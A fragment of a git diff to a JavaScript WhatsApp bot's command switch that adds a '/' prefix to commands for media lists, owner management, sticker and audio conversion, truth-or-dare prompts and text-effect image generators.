 replygcZero(`Success deleting video ${q}`)
 }
 break
-case 'listvideo':{
+case '/listvideo':{
 let teks = '┌──⭓「 *Video List* 」\n│\n'
 for (let x of VideoZero) {
 teks += `│⭔ ${x}\n`
@@ -3386,7 +3387,7 @@ teks += `│\n└────────────⭓\n\n*Totally there are :
 replygcZero(teks)
 }
 break
-case 'addimage':{
+case '/addimage':{
 if (!ZeroTheCreator) return ZeroStickOwner()
 if (args.length < 1) return replygcZero('Whats the image name?')
 if (ImageZero.includes(q)) return replygcZero("The name is already in use")
@@ -3395,10 +3396,10 @@ ImageZero.push(q)
 await fsx.copy(delb, `./Media/image/${q}.jpg`)
 fs.writeFileSync('./Media/database/Zeroimage.json', JSON.stringify(ImageZero))
 fs.unlinkSync(delb)
-replygcZero(`Success Adding Image\nCheck by typing ${prefix}listimage`)
+replygcZero(`Success Adding Image\nCheck by typing ${prefixo}listimage`)
 }
 break
-case 'delimage':{
+case '/delimage':{
 if (!ZeroTheCreator) return ZeroStickOwner()
 if (args.length < 1) return replygcZero('Enter the image name')
 if (!ImageZero.includes(q)) return replygcZero("The name does not exist in the database")
@@ -3409,7 +3410,7 @@ fs.unlinkSync(`./Media/image/${q}.jpg`)
 replygcZero(`Success deleting image ${q}`)
 }
 break
-case 'listimage':{
+case '/listimage':{
 let teks = '┌──⭓「 *Image List* 」\n│\n'
 for (let x of ImageZero) {
 teks += `│⭔ ${x}\n`
@@ -3418,7 +3419,7 @@ teks += `│\n└────────────⭓\n\n*Totally there are :
 replygcZero(teks)
 }
 break
-case 'addsticker':{
+case '/addsticker':{
 if (!ZeroTheCreator) return ZeroStickOwner()
 if (args.length < 1) return replygcZero('Whats the sticker name?')
 if (StickerZero.includes(q)) return replygcZero("The name is already in use")
@@ -3427,10 +3428,10 @@ StickerZero.push(q)
 await fsx.copy(delb, `./Media/sticker/${q}.webp`)
 fs.writeFileSync('./Media/database/Zerosticker.json', JSON.stringify(StickerZero))
 fs.unlinkSync(delb)
-replygcZero(`Success Adding Sticker\nCheck by typing ${prefix}liststicker`)
+replygcZero(`Success Adding Sticker\nCheck by typing ${prefixo}liststicker`)
 }
 break
-case 'delsticker':{
+case '/delsticker':{
 if (!ZeroTheCreator) return ZeroStickOwner()
 if (args.length < 1) return replygcZero('Enter the sticker name')
 if (!StickerZero.includes(q)) return replygcZero("The name does not exist in the database")
@@ -3441,7 +3442,7 @@ fs.unlinkSync(`./Media/sticker/${q}.webp`)
 replygcZero(`Success deleting sticker ${q}`)
 }
 break
-case 'liststicker':{
+case '/liststicker':{
 let teks = '┌──⭓「 *Sticker List* 」\n│\n'
 for (let x of StickerZero) {
 teks += `│⭔ ${x}\n`
@@ -3450,7 +3451,7 @@ teks += `│\n└────────────⭓\n\n*Totally there are :
 replygcZero(teks)
 }
 break
-case 'addvn':{
+case '/addvn':{
 if (!ZeroTheCreator) return ZeroStickOwner()
 if (args.length < 1) return replygcZero('Whats the audio name?')
 if (VoiceNoteZero.includes(q)) return replygcZero("The name is already in use")
@@ -3459,10 +3460,10 @@ VoiceNoteZero.push(q)
 await fsx.copy(delb, `./Media/audio/${q}.mp3`)
 fs.writeFileSync('./Media/database/Zerovn.json', JSON.stringify(VoiceNoteZero))
 fs.unlinkSync(delb)
-replygcZero(`Success Adding Audio\nCheck by typing ${prefix}listvn`)
+replygcZero(`Success Adding Audio\nCheck by typing ${prefixo}listvn`)
 }
 break
-case 'delvn':{
+case '/delvn':{
 if (!ZeroTheCreator) return ZeroStickOwner()
 if (args.length < 1) return replygcZero('Enter the vn name')
 if (!VoiceNoteZero.includes(q)) return replygcZero("The name does not exist in the database")
@@ -3473,7 +3474,7 @@ fs.unlinkSync(`./Media/audio/${q}.mp3`)
 replygcZero(`Success deleting vn ${q}`)
 }
 break
-case 'listvn':{
+case '/listvn':{
 let teks = '┌──⭓「 *VN List* 」\n│\n'
 for (let x of VoiceNoteZero) {
 teks += `│⭔ ${x}\n`
@@ -3482,9 +3483,9 @@ teks += `│\n└────────────⭓\n\n*Totally there are :
 replygcZero(teks)
 }
 break
-case 'addowner':
+case '/addowner':
 if (!ZeroTheCreator) return ZeroStickOwner()
-if (!args[0]) return replygcZero(`Use ${prefix+command} number\nExample ${prefix+command} ${ownernumber}`)
+if (!args[0]) return replygcZero(`Use ${prefixo+command} number\nExample ${prefixo+command} ${ownernumber}`)
 bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
 let ceknye = await client.onWhatsApp(bnnd)
 if (ceknye.length == 0) return replygcZero(`Enter A Valid And Registered Number On WhatsApp!!!`)
@@ -3492,16 +3493,16 @@ owner.push(bnnd)
 fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
 replygcZero(`Number ${bnnd} Has Become An Owner!!!`)
 break
-case 'delowner':
+case '/delowner':
 if (!ZeroTheCreator) return ZeroStickOwner()
-if (!args[0]) return replygcZero(`Use ${prefix+command} nomor\nExample ${prefix+command} 917404854406`)
+if (!args[0]) return replygcZero(`Use ${prefixo+command} nomor\nExample ${prefixo+command} 917404854406`)
 ya = q.split("|")[0].replace(/[^0-9]/g, '')
 unp = owner.indexOf(ya)
 owner.splice(unp, 1)
 fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
 replygcZero(`The Numbrr ${ya} Has been deleted from owner list by the owner!!!`)
 break
-case 'listpremium': case 'listprem':
+case '/listpremium': case '/listprem':
 teks = '*Premium List*\n\n'
 for (let client of prem) {
 teks += `- ${client}\n`
@@ -3509,7 +3510,7 @@ teks += `- ${client}\n`
 teks += `\n*Total : ${prem.length}*`
 client.sendMessage(from, { text: teks.trim() }, 'extendedTextMessage', { quoted: m, contextInfo: { "mentionedJid": prem } })
 break
-case 'setcmd': {
+case '/setcmd': {
                 if (!m.quoted) return replygcZero('Reply Message!')
                 if (!m.quoted.fileSha256) return replygcZero('SHA256 Hash Missing')
                 if (!text) return replygcZero(`For What Command?`)
@@ -3525,7 +3526,7 @@ case 'setcmd': {
                 replygcZero(`Done!`)
             }
             break
-case 'delcmd': {
+case '/delcmd': {
                 let hash = m.quoted.fileSha256.toString('base64')
                 if (!hash) return replygcZero(`No hashes`)
                 if (global.db.sticker[hash] && global.db.sticker[hash].locked) return replygcZero('You have no permission to delete this sticker command')             
@@ -3533,7 +3534,7 @@ case 'delcmd': {
                 replygcZero(`Done!`)
             }
             break
-case 'listcmd': {
+case '/listcmd': {
                 let teks = `
 *List Hash*
 Info: *bold* hash is Locked
@@ -3542,7 +3543,7 @@ ${Object.entries(global.db.sticker).map(([key, value], index) => `${index + 1}. 
                 client.sendText(m.chat, teks, m, { mentions: Object.values(global.db.sticker).map(x => x.mentionedJid).reduce((a,b) => [...a, ...b], []) })
             }
             break 
-case 'lockcmd': {
+case '/lockcmd': {
                 if (!isCreator) return ZeroStickOwner()
                 if (!m.quoted) return replygcZero('Reply Message!')
                 if (!m.quoted.fileSha256) return replygcZero('SHA256 Hash Missing')
@@ -3552,27 +3553,27 @@ case 'lockcmd': {
                 replygcZero('Done!')
             }
             break
-case 'addmsg': {
+case '/addmsg': {
                 if (!m.quoted) return replygcZero('Reply Message You Want To Save In Database')
-                if (!text) return replygcZero(`Example : ${prefix + command} filename`)
+                if (!text) return replygcZero(`Example : ${prefixo + command} filename`)
                 let msgs = global.db.database
                 if (text.toLowerCase() in msgs) return replygcZero(`'${text}' registered in the message list`)
                 msgs[text.toLowerCase()] = quoted.fakeObj
 replygcZero(`Successfully added message in message list as '${text}'
     
-Access with ${prefix}getmsg ${text}
+Access with ${prefixo}getmsg ${text}
 
-View list of Messages With ${prefix}listmsg`)
+View list of Messages With ${prefixo}listmsg`)
             }
             break
-case 'getmsg': {
-                if (!text) return replygcZero(`Example : ${prefix + command} file name\n\nView list of messages with ${prefix}listmsg`)
+case '/getmsg': {
+                if (!text) return replygcZero(`Example : ${prefixo + command} file name\n\nView list of messages with ${prefixo}listmsg`)
                 let msgs = global.db.database
                 if (!(text.toLowerCase() in msgs)) return replygcZero(`'${text}' not listed in the message list`)
                 client.copyNForward(m.chat, msgs[text.toLowerCase()], true)
             }
             break
-case 'listmsg': {
+case '/listmsg': {
                 let msgs = JSON.parse(fs.readFileSync('./database/database.json'))
 	        let seplit = Object.entries(global.db.database).map(([nama, isi]) => { return { nama, ...isi } })
 		let teks = ' DATABASE LIST \n\n'
@@ -3582,22 +3583,22 @@ case 'listmsg': {
 	        replygcZero(teks)
 	    }
 	    break
-	case 'delmsg': case 'deletemsg': {
+	case '/delmsg': case '/deletemsg': {
 	        let msgs = global.db.database
 	        if (!(text.toLowerCase() in msgs)) return replygcZero(`'${text}' not listed in the message list`)
 		delete msgs[text.toLowerCase()]
 		replygcZero(`Successfully deleted '${text}' from the message list`)
             }
 	    break
-case 'setexif': {
+case '/setexif': {
                if (!ZeroTheCreator) return ZeroStickOwner()
-               if (!text) return replygcZero(`Example : ${prefix + command} packname|author`)
+               if (!text) return replygcZero(`Example : ${prefixo + command} packname|author`)
           global.packname = text.split("|")[0]
           global.author = text.split("|")[1]
           replygcZero(`Exif has been successfully changed to\n\n${themeemoji} Packname : ${global.packname}\n${themeemoji} Author : ${global.author}`)
             }
             break
-case 'getbio':{
+case '/getbio':{
               try {
     let who
     if (m.isGroup) who = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted.sender
@@ -3616,11 +3617,11 @@ case 'getbio':{
   }
 }
 break
-case 'setppbot': case 'setbotpp': {
+case '/setppbot': case '/setbotpp': {
 if (!ZeroTheCreator) return ZeroStickOwner()
-if (!quoted) return replygcZero(`Send/Reply Image With Caption ${prefix + command}`)
-if (!/image/.test(mime)) return replygcZero(`Send/Reply Image With Caption ${prefix + command}`)
-if (/webp/.test(mime)) return replygcZero(`Send/Reply Image With Caption ${prefix + command}`)
+if (!quoted) return replygcZero(`Send/Reply Image With Caption ${prefixo + command}`)
+if (!/image/.test(mime)) return replygcZero(`Send/Reply Image With Caption ${prefixo + command}`)
+if (/webp/.test(mime)) return replygcZero(`Send/Reply Image With Caption ${prefixo + command}`)
 var medis = await client.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
 if (args[0] == `full`) {
 var { img } = await generateProfilePicture(medis)
@@ -3648,9 +3649,9 @@ replygcZero(`Success`)
 }
 }
 break
-case 'creategc': case 'creategroup': {
+case '/creategc': case '/creategroup': {
 if (!ZeroTheCreator) return ZeroStickOwner()
-if (!args.join(" ")) return replygcZero(`Use ${prefix+command} groupname`)
+if (!args.join(" ")) return replygcZero(`Use ${prefixo+command} groupname`)
 try {
 let cret = await client.groupCreate(args.join(" "), [])
 let response = await client.groupInviteCode(cret.id)
@@ -3668,12 +3669,12 @@ replygcZero("Error!")
 }
 }
 break
-case 'cry': case 'kill': case 'hug': case 'pat': case 'lick': 
-case 'kiss': case 'bite': case 'yeet': case 'bully': case 'bonk':
-case 'wink': case 'poke': case 'nom': case 'slap': case 'smile': 
-case 'wave': case 'awoo': case 'blush': case 'smug': case 'glomp': 
-case 'happy': case 'dance': case 'cringe': case 'cuddle': case 'highfive': 
-case 'shinobu': case 'handhold': {
+case '/cry': case '/kill': case '/hug': case '/pat': case '/lick': 
+case '/kiss': case '/bite': case '/yeet': case '/bully': case '/bonk':
+case '/wink': case '/poke': case '/nom': case '/slap': case '/smile': 
+case '/wave': case '/awoo': case '/blush': case '/smug': case '/glomp': 
+case '/happy': case '/dance': case '/cringe': case '/cuddle': case '/highfive': 
+case '/shinobu': case '/handhold': {
 
 axios.get(`https://api.waifu.pics/sfw/${command}`)
 .then(({data}) => {
@@ -3681,26 +3682,26 @@ client.sendImageAsSticker(from, data.url, m, { packname: global.packname, author
 })
 }
 break
-case 'woof':
-case '8ball':
-case 'goose':
-case 'gecg':
-case 'feed':
-case 'avatar':
-case 'fox_girl':
-case 'lizard':
-case 'spank':
-case 'meow':
-case 'tickle':{
+case '/woof':
+case '/8ball':
+case '/goose':
+case '/gecg':
+case '/feed':
+case '/avatar':
+case '/fox_girl':
+case '/lizard':
+case '/spank':
+case '/meow':
+case '/tickle':{
                 axios.get(`https://nekos.life/api/v2/img/${command}`)
 .then(({data}) => {
 client.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
 })
 }
 break
-case 'tomp4': case 'tovideo': {
+case '/tomp4': case '/tovideo': {
                 if (!quoted) return replygcZero('Reply to Sticker')
-                if (!/webp/.test(mime)) return replygcZero(`reply sticker with caption *${prefix + command}*`)
+                if (!/webp/.test(mime)) return replygcZero(`reply sticker with caption *${prefixo + command}*`)
                 ZeroStickWait()
 		        let { webp2mp4File } = require('./lib/uploader')
                 let media = await client.downloadAndSaveMediaMessage(quoted)
@@ -3709,9 +3710,9 @@ case 'tomp4': case 'tovideo': {
                 await fs.unlinkSync(media)
             }
             break
-            case 'toaud': case 'toaudio': {
-            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcZero(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
-            if (!quoted) return replygcZero(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
+            case '/toaud': case '/toaudio': {
+            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcZero(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefixo + command}`)
+            if (!quoted) return replygcZero(`Send/Reply Video/Audio You Want to Use as Audio With Caption ${prefixo + command}`)
             ZeroStickWait()
             let media = await quoted.download()
             let { toAudio } = require('./lib/converter')
@@ -3719,10 +3720,10 @@ case 'tomp4': case 'tovideo': {
             client.sendMessage(from, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
             }
             break
-            case 'tomp3': {
-            if (/document/.test(mime)) return replygcZero(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
-            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcZero(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
-            if (!quoted) return replygcZero(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
+            case '/tomp3': {
+            if (/document/.test(mime)) return replygcZero(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefixo + command}`)
+            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcZero(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefixo + command}`)
+            if (!quoted) return replygcZero(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefixo + command}`)
             ZeroStickWait()
             let media = await quoted.download()
             let { toAudio } = require('./lib/converter')
@@ -3730,9 +3731,9 @@ case 'tomp4': case 'tovideo': {
             client.sendMessage(from, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${client.user.name}.mp3`}, { quoted : m })
             }
             break
-            case 'tovn': case 'toptt': {
-            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcZero(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
-            if (!quoted) return replygcZero(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
+            case '/tovn': case '/toptt': {
+            if (!/video/.test(mime) && !/audio/.test(mime)) return replygcZero(`Reply Video/Audio That You Want To Be VN With Caption ${prefixo + command}`)
+            if (!quoted) return replygcZero(`Reply Video/Audio That You Want To Be VN With Caption ${prefixo + command}`)
             ZeroStickWait()
             let media = await quoted.download()
             let { toPTT } = require('./lib/converter')
@@ -3740,9 +3741,9 @@ case 'tomp4': case 'tovideo': {
             client.sendMessage(from, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
             }
             break
-            case 'togif': {
+            case '/togif': {
                 if (!quoted) return replygcZero('Reply video')
-                if (!/webp/.test(mime)) return replygcZero(`reply sticker with caption *${prefix + command}*`)
+                if (!/webp/.test(mime)) return replygcZero(`reply sticker with caption *${prefixo + command}*`)
                 ZeroStickWait()
 		let { webp2mp4File } = require('./lib/uploader')
                 let media = await client.downloadAndSaveMediaMessage(quoted)
@@ -3751,7 +3752,7 @@ case 'tomp4': case 'tovideo': {
                 await fs.unlinkSync(media)
             }
             break
-            case 'toqr':{
+            case '/toqr':{
   if (!q) return replygcZero(' Please include link or text!')
    const QrCode = require('qrcode-reader')
    const qrcode = require('qrcode')
@@ -3764,7 +3765,7 @@ case 'tomp4': case 'tovideo': {
    setTimeout(() => { fs.unlinkSync(buff) }, 10000)
   }
   break
-  case 'dare':
+  case '/dare':
               const dare =[
     "eat 2 tablespoons of rice without any side dishes, if it's dragging you can drink",
     "spill people who make you pause",
@@ -3853,7 +3854,7 @@ case 'tomp4': case 'tovideo': {
               client.sendMessage(from, { image: bufferdare, caption: '_You choose DARE_\n'+ Zerodare }, {quoted:m})
               break
                             break
-       case 'truth':
+       case '/truth':
               const truth =[
     "Have you ever liked anyone? How long?",
     "If you can or if you want, which gc/outside gc would you make friends with? (maybe different/same type)",
@@ -3949,7 +3950,7 @@ case 'tomp4': case 'tovideo': {
               buffertruth = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
               client.sendMessage(from, { image: buffertruth, caption: '_You choose TRUTH_\n'+ Zerotruth }, {quoted:m})
               break
-case 'checkme':
+case '/checkme':
 					neme = args.join(" ")
 					bet = `${sender}`
 					var sifat = ['Fine','Unfriendly','Chapri','Nibba/nibbi','Annoying','Dilapidated','Angry person','Polite','Burden','Great','Cringe','Liar']
@@ -3993,7 +3994,7 @@ case 'checkme':
 					buff = await getBuffer(defaultpp)
 client.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
 break
-case 'toimg': {
+case '/toimg': {
 	ZeroStickWait()
 	const getRandom = (ext) => {
             return `${Math.floor(Math.random() * 10000)}${ext}`
@@ -4014,7 +4015,7 @@ fs.unlinkSync(name)
 } else return replygcZero(`Please reply to non animated sticker`)
     }
     break
-case 'swm': case 'steal': case 'stickerwm': case 'take':{
+case '/swm': case '/steal': case '/stickerwm': case '/take':{
 if (!isPrem) return replyprem(mess.premium)
 if (!args.join(" ")) return replygcZero(`Where is the text?`)
 const swn = args.join(" ")
@@ -4035,7 +4036,7 @@ replygcZero(`Photo/Video?`)
 }
 }
 break
-case 'qc': case'text': {
+case '/qc': case'text': {
     if (!args[0] && !m.quoted) {
       return replygcZero(`Where is the text?`)
     }
@@ -4093,55 +4094,55 @@ case 'qc': case'text': {
     }
     }
     break
-case 's': case 'sticker': case 'stiker': {
-if (!quoted) return replygcZero(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
+case '/s': case '/sticker': case '/stiker': {
+if (!quoted) return replygcZero(`Send/Reply Images/Videos/Gifs With Captions ${prefixo+command}\nVideo Duration 1-9 Seconds`)
 if (/image/.test(mime)) {
 let media = await quoted.download()
 let encmedia = await client.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 
 } else if (/video/.test(mime)) {
-if ((quoted.msg || quoted).seconds > 11) return replygcZero('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
+if ((quoted.msg || quoted).seconds > 11) return replygcZero('Send/Reply Images/Videos/Gifs With Captions ${prefixo+command}\nVideo Duration 1-9 Seconds')
 let media = await quoted.download()
 let encmedia = await client.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 
 } else {
-replygcZero(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
+replygcZero(`Send/Reply Images/Videos/Gifs With Captions ${prefixo+command}\nVideo Duration 1-9 Seconds`)
 }
 }
 break
-case 'quotes':
+case '/quotes':
 const quoteZeroy = await axios.get(`https://favqs.com/api/qotd`)
         const textquotes = `*${themeemoji} Quote:* ${quoteZeroy.data.quote.body}\n\n*${themeemoji} Author:* ${quoteZeroy.data.quote.author}`
 return replygcZero(textquotes)
 break
-case 'handsomecheck':
-				if (!text) return replygcZero(`Tag Someone, Example : ${prefix + command} @Zero`)
+case '/handsomecheck':
+				if (!text) return replygcZero(`Tag Someone, Example : ${prefixo + command} @Zero`)
 					const gan = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					const teng = gan[Math.floor(Math.random() * gan.length)]
 client.sendMessage(from, { text: `*${command}*\n\nName : ${q}\nAnswer : *${teng}%*` }, { quoted: m })
 					break
-case 'beautifulcheck':
-				if (!text) return replygcZero(`Tag Someone, Example : ${prefix + command} @Zero`)
+case '/beautifulcheck':
+				if (!text) return replygcZero(`Tag Someone, Example : ${prefixo + command} @Zero`)
 					const can = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					const tik = can[Math.floor(Math.random() * can.length)]
 client.sendMessage(from, { text: `*${command}*\n\nNama : ${q}\nAnswer : *${tik}%*` }, { quoted: m })
 					break
-					case 'charactercheck':
-					if (!text) return replygcZero(`Tag Someone, Example : ${prefix + command} @Zero`)
+					case '/charactercheck':
+					if (!text) return replygcZero(`Tag Someone, Example : ${prefixo + command} @Zero`)
 					const Zeroy =['Compassionate','Generous','Grumpy','Forgiving','Obedient','Good','Simp','Kind-Hearted','patient','UwU','top, anyway','Helpful']
 					const taky = Zeroy[Math.floor(Math.random() * Zeroy.length)]
 					client.sendMessage(from, { text: `Character Check : ${q}\nAnswer : *${taky}*` }, { quoted: m })
 				     break
-case 'awesomecheck':
-  case 'greatcheck':
-    case 'gaycheck':
-      case 'cutecheck':
-        case 'lesbicheck':
-          case 'lesbiancheck':
-             case 'hornycheck':
-                 case 'prettycheck':
-                    case 'lovelycheck':
-                      case 'uglycheck':
+case '/awesomecheck':
+  case '/greatcheck':
+    case '/gaycheck':
+      case '/cutecheck':
+        case '/lesbicheck':
+          case '/lesbiancheck':
+             case '/hornycheck':
+                 case '/prettycheck':
+                    case '/lovelycheck':
+                      case '/uglycheck':
 if (!m.isGroup) return ZeroStickGroup()
 const cex = body.slice(0)
 const cek1 = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
@@ -4154,14 +4155,14 @@ client.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${me
 client.sendMessage(from, { text: 'Question : *' + cex + '*\nChecker : ' + `@${sender.split('@')[0]}` + '\nAnswer : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
 }
 break
-case 'obfus': case 'obfuscate':{
-if (!q) return replygcZero(`Example ${prefix+command} const Zerobot = require('baileys')`)
+case '/obfus': case '/obfuscate':{
+if (!q) return replygcZero(`Example ${prefixo+command} const Zerobot = require('baileys')`)
 let meg = await obfus(q)
 replygcZero(`Success
 ${meg.result}`)
 }
 break
-case 'style': case 'styletext': {
+case '/style': case '/styletext': {
 		let { styletext } = require('./lib/scraper')
 		if (!text) return replygcZero('Enter Query text!')
                 let anu = await styletext(text)
@@ -4172,65 +4173,65 @@ case 'style': case 'styletext': {
                 replygcZero(teks)
 	    }
 	    break
-case 'candy': 
-case 'christmas': 
-case '3dchristmas': 
-case 'sparklechristmas':
-case 'deepsea': 
-case 'scifi': 
-case 'rainbow': 
-case 'waterpipe': 
-case 'spooky': 
-case 'pencil': 
-case 'circuit': 
-case 'discovery': 
-case 'metalic': 
-case 'fiction': 
-case 'demon': 
-case 'transformer': 
-case 'berry': 
-case 'thunder': 
-case 'magma': 
-case '3dstone': 
-case 'neonlight': 
-case 'glitch': 
-case 'harrypotter': 
-case 'brokenglass': 
-case 'papercut': 
-case 'watercolor': 
-case 'multicolor': 
-case 'neondevil': 
-case 'underwater': 
-case 'graffitibike':
-case 'snow': 
-case 'cloud': 
-case 'honey': 
-case 'ice': 
-case 'fruitjuice': 
-case 'biscuit': 
-case 'wood': 
-case 'chocolate': 
-case 'strawberry': 
-case 'matrix': 
-case 'blood': 
-case 'dropwater': 
-case 'toxic': 
-case 'lava': 
-case 'rock': 
-case 'bloodglas': 
-case 'hallowen': 
-case 'darkgold': 
-case 'joker': 
-case 'wicker':
-case 'firework': 
-case 'skeleton': 
-case 'blackpink': 
-case 'sand': 
-case 'glue': 
-case '1917': 
-case 'leaves': {
+case '/candy': 
+case '/christmas': 
+case '/3dchristmas': 
+case '/sparklechristmas':
+case '/deepsea': 
+case '/scifi': 
+case '/rainbow': 
+case '/waterpipe': 
+case '/spooky': 
+case '/pencil': 
+case '/circuit': 
+case '/discovery': 
+case '/metalic': 
+case '/fiction': 
+case '/demon': 
+case '/transformer': 
+case '/berry': 
+case '/thunder': 
+case '/magma': 
+case '/3dstone': 
+case '/neonlight': 
+case '/glitch': 
+case '/harrypotter': 
+case '/brokenglass': 
+case '/papercut': 
+case '/watercolor': 
+case '/multicolor': 
+case '/neondevil': 
+case '/underwater': 
+case '/graffitibike':
+case '/snow': 
+case '/cloud': 
+case '/honey': 
+case '/ice': 
+case '/fruitjuice': 
+case '/biscuit': 
+case '/wood': 
+case '/chocolate': 
+case '/strawberry': 
+case '/matrix': 
+case '/blood': 
+case '/dropwater': 
+case '/toxic': 
+case '/lava': 
+case '/rock': 
+case '/bloodglas': 
+case '/hallowen': 
+case '/darkgold': 
+case '/joker': 
+case '/wicker':
+case '/firework': 
+case '/skeleton': 
+case '/blackpink': 
+case '/sand': 
+case '/glue': 
+case '/1917': 
+case '/leaves': {
 
-if (!q) return replygcZero(`Example : ${prefix+command} client`) 
+if (!q) return replygcZero(`Example : ${prefixo+command} client`) 
 ZeroStickWait()
 let link
 if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
@@ -4294,38 +4295,38 @@ let anu = await textpro.textpro(link, q)
 client.sendMessage(from, { image: { url: anu }, caption: `${mess.success}` }, { quoted: m })
 }
 break
-case 'glitchtext':
-case 'writetext':
-case 'advancedglow':
-case 'typographytext':
-case 'pixelglitch':
-case 'neonglitch':
-case 'flagtext':
-case 'flag3dtext':
-case 'deletingtext':
-case 'blackpinkstyle':
-case 'glowingtext':
-case 'underwatertext':
-case 'logomaker':
-case 'cartoonstyle':
-case 'papercutstyle':
-case 'watercolortext':
-case 'effectclouds':
-case 'blackpinklogo':
-case 'gradienttext':
-case 'summerbeach':
-case 'luxurygold':
-case 'multicoloredneon':
-case 'sandsummer':
-case 'galaxywallpaper':
-case '1917style':
-case 'makingneon':
-case 'royaltext':
-case 'freecreate':
-case 'galaxystyle':
-case 'lighteffects':{
+case '/glitchtext':
+case '/writetext':
+case '/advancedglow':
+case '/typographytext':
+case '/pixelglitch':
+case '/neonglitch':
+case '/flagtext':
+case '/flag3dtext':
+case '/deletingtext':
+case '/blackpinkstyle':
+case '/glowingtext':
+case '/underwatertext':
+case '/logomaker':
+case '/cartoonstyle':
+case '/papercutstyle':
+case '/watercolortext':
+case '/effectclouds':
+case '/blackpinklogo':
+case '/gradienttext':
+case '/summerbeach':
+case '/luxurygold':
+case '/multicoloredneon':
+case '/sandsummer':
+case '/galaxywallpaper':
+case '/1917style':
+case '/makingneon':
+case '/royaltext':
+case '/freecreate':
+case '/galaxystyle':
+case '/lighteffects':{
 
-if (!q) return replygcZero(`Example : ${prefix+command} client`) 
+if (!q) return replygcZero(`Example : ${prefixo+command} client`) 
 ZeroStickWait()
 let link
 if (/glitchtext/.test(command)) link = 'https://en.ephoto360.com/create-digital-glitch-text-effects-online-767.html'
@@ -4362,35 +4363,35 @@ let haldwhd = await ephoto(link, q)
 client.sendMessage(from, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
 }
 break
-case 'shadow': 
-case 'write': 
-case 'romantic': 
-case 'burnpaper':
-case 'smoke': 
-case 'narutobanner': 
-case 'love': 
-case 'undergrass':
-case 'doublelove': 
-case 'coffecup':
-case 'underwaterocean':
-case 'smokyneon':
-case 'starstext':
-case 'rainboweffect':
-case 'balloontext':
-case 'metalliceffect':
-case 'embroiderytext':
-case 'flamingtext':
-case 'stonetext':
-case 'writeart':
-case 'summertext':
-case 'wolfmetaltext':
-case 'nature3dtext':
-case 'rosestext':
-case 'naturetypography':
-case 'quotesunder':
-case 'shinetext':{
+case '/shadow': 
+case '/write': 
+case '/romantic': 
+case '/burnpaper':
+case '/smoke': 
+case '/narutobanner': 
+case '/love': 
+case '/undergrass':
+case '/doublelove': 
+case '/coffecup':
+case '/underwaterocean':
+case '/smokyneon':
+case '/starstext':
+case '/rainboweffect':
+case '/balloontext':
+case '/metalliceffect':
+case '/embroiderytext':
+case '/flamingtext':
+case '/stonetext':
+case '/writeart':
+case '/summertext':
+case '/wolfmetaltext':
+case '/nature3dtext':
+case '/rosestext':
+case '/naturetypography':
+case '/quotesunder':
+case '/shinetext':{
 
-if (!q) return replygcZero(`Example : ${prefix+command} client`) 
+if (!q) return replygcZero(`Example : ${prefixo+command} client`) 
 ZeroStickWait()
 let link
 if (/stonetext/.test(command)) link = 'https://photooxy.com/online-3d-white-stone-text-effect-utility-411.html'
@@ -4424,8 +4425,8 @@ let dehe = await photooxy.photoOxy(link, q)
